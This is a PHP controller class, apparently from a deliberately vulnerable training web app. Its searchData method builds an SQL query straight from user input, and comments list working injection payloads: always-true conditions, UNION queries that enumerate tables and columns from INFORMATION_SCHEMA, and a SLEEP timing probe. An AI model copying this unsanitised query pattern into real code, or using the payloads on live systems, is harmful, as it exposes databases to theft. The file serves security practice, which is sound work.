<?php

class home_controller extends home_model {

  private $conn;
  private $sql;

  public function __construct() {

    $db = new parent();
    $this->conn = $db->connect();
  }

  //controller
  public function fetchData() {

    $this->sql = "SELECT class_name, php_page, title FROM home_buttons";

    if (!is_null($this->conn)) {

      $result = mysqli_query($this->conn, $this->sql);
      return $result;

      $this->conn->close();
    }
    else {
      echo "Connection failed";
    }
  }

  public function searchData($query) {

    $this->sql = "SELECT title FROM home_buttons WHERE title LIKE '$query%'";

    //%' OR '%
    //%' OR '1' = '1
    //prints everything

    //sql' OR title LIKE 'cross
    //prints cross-site scripting

    //' union select title FROM home_buttons -- '
    //title can be replaced with php_page, id, etc

    //sql' OR title LIKE 'cross
    //prints cross-site scripting

    //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_TABLES -- '
    //prints names of all tables

    //sleep
    //sql'  UNION SELECT SLEEP(3)-- '

    //gets columns of home table (43 from TABLE_ID in SYS_TABLES)
    //' union select name FROM INFORMATION_SCHEMA.INNODB_SYS_COLUMNS WHERE TABLE_ID = '43' -- '

    $result = mysqli_query($this->conn, $this->sql);

    echo "Num rows: ". $result->num_rows . "<br />";

    return $result;

    //$this->conn->close();
  }
}
?>
